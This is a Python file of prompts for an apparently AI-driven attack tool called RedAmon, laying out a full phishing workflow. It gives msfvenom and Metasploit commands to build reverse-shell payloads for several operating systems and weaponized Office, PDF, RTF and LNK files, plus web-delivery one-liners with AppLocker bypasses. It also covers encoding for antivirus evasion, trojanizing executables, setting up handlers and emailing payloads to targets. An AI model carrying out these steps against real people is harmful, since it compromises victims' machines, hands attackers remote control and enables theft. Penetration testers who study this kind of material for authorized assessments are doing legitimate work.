"""
RedAmon Phishing / Social Engineering Prompts

Prompts for social engineering attack workflows including payload generation,
malicious document creation, web delivery, handler setup, and email delivery.
"""


# =============================================================================
# PHISHING / SOCIAL ENGINEERING MAIN WORKFLOW
# =============================================================================

PHISHING_SOCIAL_ENGINEERING_TOOLS = """
## ATTACK SKILL: PHISHING / SOCIAL ENGINEERING

**CRITICAL: This attack skill has been CLASSIFIED as phishing / social engineering.**
**You MUST use the social engineering workflow below.**

Focus on generating payloads, malicious documents, or web delivery mechanisms
and delivering them to the target. Do NOT switch to other attack chain unless the user explicitly requests it.

---

## MANDATORY SOCIAL ENGINEERING WORKFLOW

Complete these steps in order. Choose the DELIVERY METHOD that best matches the objective,
then follow the corresponding sub-workflow.

**Before generating payloads or setting up handlers: request `transition_phase` to exploitation.**
This unlocks `metasploit_console` and `kali_shell` (msfvenom) and ensures findings are tracked correctly.

### Step 1: Determine Target Platform and Delivery Method

**Ask the user (if not clear from the objective) via action="ask_user":**
1. **Target platform**: Windows, Linux, macOS, Android, or multi-platform?
2. **Delivery method**: Which approach?
   - **A) Standalone Payload** — executable/script the target runs directly (exe, elf, apk, py, ps1, bash)
   - **B) Malicious Document** — weaponized Office/PDF/RTF/LNK file
   - **C) Web Delivery** — one-liner command the target pastes (Python/PHP/PowerShell/Regsvr32)
   - **D) HTA Delivery** — HTML Application served from attacker-hosted URL

**If the objective already specifies the platform and method, skip asking and proceed.**

### Step 2: Set Up the Handler (ALWAYS — do this FIRST or IN PARALLEL)

**The handler catches the callback when the target executes the payload.**

**CRITICAL: ALWAYS use Metasploit `exploit/multi/handler` via the `metasploit_console` tool.**
**NEVER use `nc`, `ncat`, `netcat`, or `socat` as a listener — even for plain shell payloads like `cmd/unix/reverse_bash`.**
**Only Metasploit handlers create tracked sessions that appear in the RedAmon Remote Shells UI.**
**A plain netcat listener will catch the shell but RedAmon cannot detect, display, or interact with it.**
**If `metasploit_console` is not available in your current phase, request a phase transition to exploitation BEFORE setting up the handler.**

Read "Pre-Configured Payload Settings" section (if present above) FIRST.
It tells you whether to use REVERSE or BIND mode. Follow ONLY that mode's setup.

**REVERSE mode handler (most common for phishing):**
```
use exploit/multi/handler; set PAYLOAD <payload_from_step_3>; set LHOST <LHOST>; set LPORT <LPORT>; run -j
```
Follow the exact handler commands from "Pre-Configured Payload Settings" above (includes ngrok settings if active).

**BIND mode handler (rare for phishing, target must be reachable):**
```
use exploit/multi/handler; set PAYLOAD <bind_payload>; set RHOST <target-ip>; set LPORT <BIND_PORT>; run -j
```

**IMPORTANT:** The handler MUST use the EXACT SAME payload as the generated artifact (Step 3).
Mismatched payloads = the callback silently fails.

Run the handler with `-j` (background job) so it waits while you prepare and deliver the payload.

### Step 3: Generate the Payload/Document (choose ONE method)

---

#### Method A: Standalone Payload (msfvenom via `kali_shell`)

Generate a payload binary/script using msfvenom:

```
kali_shell: "msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -f <format> -o /tmp/<output_filename>"
```

**Payload + Format Selection Matrix** (STAGELESS — works through any tunnel):

**CRITICAL: CHECK "Pre-Configured Payload Settings" ABOVE. If ngrok or chisel is active, use the stageless payloads below. Staged variants FAIL through tunnels — sessions die in a loop.**

| Target OS | Payload (stageless) | Format (`-f`) | Output File | Notes |
|-----------|---------------------|---------------|-------------|-------|
| Windows | `windows/meterpreter_reverse_tcp` | `exe` | `/tmp/payload.exe` | Most common |
| Windows | `windows/meterpreter_reverse_https` | `exe` | `/tmp/payload.exe` | Encrypted, firewall bypass |
| Windows | `windows/shell_reverse_tcp` | `exe` | `/tmp/shell.exe` | Shell fallback |
| Windows | `windows/meterpreter_reverse_tcp` | `psh` / `psh-reflection` | `/tmp/payload.ps1` | PowerShell (fileless / AV evasion) |
| Windows | `windows/meterpreter_reverse_tcp` | `vba` | `/tmp/payload.vba` | VBA macro (Office) |
| Windows | `windows/meterpreter_reverse_tcp` | `hta-psh` | `/tmp/payload.hta` | HTA wrapping PS |
| Linux | `linux/x64/meterpreter_reverse_tcp` | `elf` | `/tmp/payload.elf` | Standard Linux |
| Linux | `linux/x64/shell_reverse_tcp` | `elf` | `/tmp/shell.elf` | Shell fallback |
| Linux | `cmd/unix/reverse_bash` | `raw` | `/tmp/payload.sh` | Bash one-liner |
| Linux | `cmd/unix/reverse_python` | `raw` | `/tmp/payload.py` | Python one-liner |
| macOS | `osx/x64/meterpreter_reverse_tcp` | `macho` | `/tmp/payload.macho` | Mach-O |
| Android | `android/meterpreter_reverse_tcp` | `raw` | `/tmp/payload.apk` | APK |
| Java/Web | `java/meterpreter_reverse_tcp` | `war` | `/tmp/payload.war` | Tomcat/JBoss |
| Multi | `python/meterpreter_reverse_tcp` | `raw` | `/tmp/payload.py` | Cross-platform |

**Staged variant (direct connections only — NOT through tunnels):** replace the underscore with a slash to switch, e.g. `windows/meterpreter_reverse_tcp` → `windows/meterpreter/reverse_tcp`. The handler payload MUST EXACTLY MATCH the msfvenom payload — mixing staged/stageless = silent failure.

**Encoding for AV evasion (optional):**
```
msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 5 -f exe -o /tmp/payload_encoded.exe
```

**After generation:** Verify the file was created:
```
kali_shell: "ls -la /tmp/payload.exe && file /tmp/payload.exe"
```

---

#### Method B: Malicious Document (Metasploit fileformat modules via `metasploit_console`)

Use Metasploit fileformat modules to generate weaponized documents.

**Tunnel note:** If ngrok or chisel is active, replace staged (`/`) with stageless (`_`) payloads.
Staged payloads only work with direct connections (no tunnel).

**B1: Word Document with VBA Macro**
```
use exploit/multi/fileformat/office_word_macro; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set FILENAME malicious.docm; run
```

**B2: Excel Document with VBA Macro**
```
use exploit/multi/fileformat/office_excel_macro; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set FILENAME malicious.xlsm; run
```

**B3: PDF Exploit (Adobe Reader)**
```
use exploit/windows/fileformat/adobe_pdf_embedded_exe; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set FILENAME malicious.pdf; run
```

**B4: RTF with HTA Handler (CVE-2017-0199)**
```
use exploit/windows/fileformat/office_word_hta; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set SRVHOST 0.0.0.0; set SRVPORT 8080; set FILENAME malicious.rtf; run
```
This module self-hosts the HTA payload — the RTF fetches it automatically when opened.

**B5: LNK File (Malicious Shortcut)**
```
use exploit/windows/fileformat/lnk_shortcut_ftype_append; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set FILENAME malicious.lnk; run
```

**CRITICAL: Fileformat module output location:**
All fileformat modules save output to `/root/.msf4/local/<FILENAME>`.
After generation, ALWAYS copy to `/tmp/` for easier access:
```
kali_shell: "cp /root/.msf4/local/<filename> /tmp/ && ls -la /tmp/<filename>"
```

---

#### Method C: Web Delivery (Metasploit web_delivery via `metasploit_console`)

Host a payload on a web server and generate a one-liner for the target to execute.

**⚠ TUNNEL COMPATIBILITY:**
Web delivery requires TWO open ports reachable by the target:
1. **SRVPORT** (e.g. 8080) — HTTP server that serves the payload download
2. **LPORT** (e.g. 4444) — reverse handler that catches the Meterpreter callback

**→ If using ngrok (single tunnel): DO NOT use web_delivery.** ngrok only forwards ONE port (LPORT). Use Method A instead.
**→ If using chisel tunnel: web delivery WORKS!** Chisel tunnels BOTH SRVPORT (8080) and LPORT (4444).
   Set `SRVHOST 0.0.0.0` and `SRVPORT 8080`. The target downloads from `http://<VPS>:8080/...`.
**→ If on the same LAN as the target: web delivery works** (both ports directly reachable).

```
use exploit/multi/script/web_delivery; set TARGET <target_number>; set PAYLOAD <payload>; set LHOST <LHOST>; set LPORT <LPORT>; set SRVHOST 0.0.0.0; set SRVPORT <srv_port>; run -j
```

**Target Selection:**

| TARGET # | Language | One-liner runs on | Payload |
|----------|----------|-------------------|---------|
| 0 | Python | Linux/macOS/Win with Python | `python/meterpreter/reverse_tcp` |
| 1 | PHP | Web server with PHP | `php/meterpreter/reverse_tcp` |
| 2 | PSH (PowerShell) | Windows | `windows/meterpreter/reverse_tcp` |
| 3 | Regsvr32 | Windows (AppLocker bypass) | `windows/meterpreter/reverse_tcp` |
| 4 | pubprn | Windows (script bypass) | `windows/meterpreter/reverse_tcp` |
| 5 | SyncAppvPublishingServer | Windows (bypass) | `windows/meterpreter/reverse_tcp` |
| 6 | PSH (Binary) | Windows | `windows/meterpreter/reverse_tcp` |

**After running:** The module prints a one-liner command. Copy this — it IS the delivery payload.
The web_delivery server runs as a background job until the target executes the one-liner.

---

#### Method D: HTA Delivery Server (`metasploit_console`)

Host an HTA (HTML Application) that executes a payload when opened in a browser.

**⚠ Same TUNNEL COMPATIBILITY as Method C:**
HTA delivery also requires two reachable ports (SRVPORT for the HTA download + LPORT for the reverse callback).
**→ If using ngrok (single tunnel): DO NOT use HTA delivery.** Use Method A instead.
**→ If using chisel tunnel: HTA delivery WORKS!** Set `SRVHOST 0.0.0.0` and `SRVPORT 8080`.
**→ If on the same LAN: HTA delivery works.**

```
use exploit/windows/misc/hta_server; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set SRVHOST 0.0.0.0; set SRVPORT 8080; run -j
```

**After running:** The module prints a URL like `http://<SRVHOST>:8080/random.hta`.
The target must visit this URL or open the `.hta` file for the payload to execute.

---

### Step 4: Verify Payload/Document Was Generated

**For msfvenom payloads (Method A):**
```
kali_shell: "ls -la /tmp/<filename> && file /tmp/<filename>"
```

**For fileformat modules (Method B):**
```
kali_shell: "ls -la /root/.msf4/local/ && cp /root/.msf4/local/<filename> /tmp/"
```

**For web_delivery / HTA server (Method C & D):**
Confirm the job is running: `jobs` in metasploit_console.
Note the URL or one-liner printed in the output.

### Step 5: Deliver to Target

#### Chat Download (default)
Report the file location and details to the user.
The file will be available for download directly in the chat interface:
- File path: `/tmp/<filename>`
- File size and type (from `ls -la` and `file` output)
- Payload type and callback parameters (LHOST:LPORT)
- Handler status (running in background)

#### Email Delivery (if user requests)
Use `execute_code` with Python `smtplib` to send the payload/document as an email attachment or link.
- If "Pre-Configured SMTP Settings" section exists above, use those settings directly.
- If NO SMTP settings are configured, **MUST** ask user via `action="ask_user"` for: SMTP host, port, username, password, sender address, and target email. Do NOT attempt to send without credentials.

#### Web Delivery Link (Method C & D)
Report the one-liner command (Method C) or URL (Method D) to the user.

---

## TROUBLESHOOTING

| Problem | Fix |
|---------|-----|
| msfvenom "Invalid payload" | Check payload name: `kali_shell: "msfvenom --list payloads \\| grep <term>"` |
| Fileformat module "exploit completed but no session" | EXPECTED — fileformat modules generate files, not sessions. Session comes when target opens the file. |
| Handler dies immediately | Check LHOST is correct. If using ngrok or chisel, ensure `ReverseListenerBindAddress 127.0.0.1` and `ReverseListenerBindPort 4444` are set. |
| Target executes but no callback | Check firewall/NAT. Try `reverse_https` or `bind_tcp` instead. If using ngrok or chisel, verify you are using a STAGELESS payload (underscore `_` not slash `/`). If using chisel, also check `/var/log/chisel.log` in kali-sandbox. |
| Session opens then dies instantly | You are using a STAGED payload through a tunnel (ngrok or chisel) — switch to STAGELESS (e.g. `meterpreter_reverse_tcp` not `meterpreter/reverse_tcp`). Staged payloads only work with direct connections. |
| "Payload is too large" | Use staged payload (e.g., `reverse_tcp` not `reverse_tcp_rc4`) or different encoder. |
| Web delivery one-liner blocked | Try different TARGET (Regsvr32=3 for AppLocker bypass). |
| Web delivery: no session (ngrok) | Web delivery CANNOT work through ngrok (needs TWO ports). Switch to Method A or use chisel tunnel instead. |
| Web delivery: no session (chisel) | Verify chisel is tunneling port 8080. Check `SRVHOST 0.0.0.0` and `SRVPORT 8080`. Verify the one-liner URL uses the VPS hostname. Check `/var/log/chisel.log`. |
| HTA delivery: no session (ngrok) | Same as web delivery — HTA needs SRVPORT reachable. Use Method A or chisel. |
| HTA delivery: no session (chisel) | Verify chisel tunnels port 8080. Check SRVHOST/SRVPORT settings and chisel logs. |
| No session appears in RedAmon UI | You used `nc`/`netcat`/`socat` instead of Metasploit `exploit/multi/handler`. Kill the netcat listener and set up a proper handler via `metasploit_console`. Only Metasploit sessions are tracked by RedAmon. |
| **Same approach fails 3+ times** | **STOP. Use action="ask_user" to discuss alternative approaches.** |
"""


# =============================================================================
# PAYLOAD FORMAT GUIDANCE (OS-specific selection)
# =============================================================================

PHISHING_PAYLOAD_FORMAT_GUIDANCE = """
## Payload Format Selection Guide

### Decision Tree: Which format to generate?

```
Target OS?
├── Windows
│   ├── User will run an executable? → -f exe (payload.exe)
│   ├── Need fileless/AV evasion? → -f psh-reflection (payload.ps1)
│   ├── Embedding in Office document? → -f vba (payload.vba) or use Method B
│   ├── HTA delivery? → -f hta-psh (payload.hta) or use Method D
│   └── Java web app (Tomcat)? → -f war (payload.war)
│
├── Linux
│   ├── User will run a binary? → -f elf (payload.elf)
│   ├── User has Python? → -f raw with python payload (payload.py)
│   └── User has bash? → -f raw with bash payload (payload.sh)
│
├── macOS
│   └── User will run a binary? → -f macho (payload.macho)
│
├── Android
│   └── APK install? → -f raw with android payload (payload.apk)
│
└── Unknown / Multi-platform
    ├── Python available? → -f raw with python/meterpreter (payload.py)
    └── Web server? → -f war (payload.war) or web_delivery (Method C)
```

### msfvenom Quick Reference

**List payloads:** `msfvenom --list payloads | grep <os>`
**List formats:** `msfvenom --list formats`
**List encoders:** `msfvenom --list encoders`

**Common flags:**
- `-p <payload>` — payload to use
- `LHOST=<ip>` — callback IP
- `LPORT=<port>` — callback port
- `-f <format>` — output format
- `-o <file>` — output file path
- `-e <encoder>` — encoder for AV evasion (e.g., `x86/shikata_ga_nai`)
- `-i <count>` — encoding iterations
- `-a <arch>` — architecture (x86, x64)
- `--platform <os>` — target platform
- `-x <template>` — embed in existing executable (trojanize)
- `-k` — keep template functionality (with -x)
"""
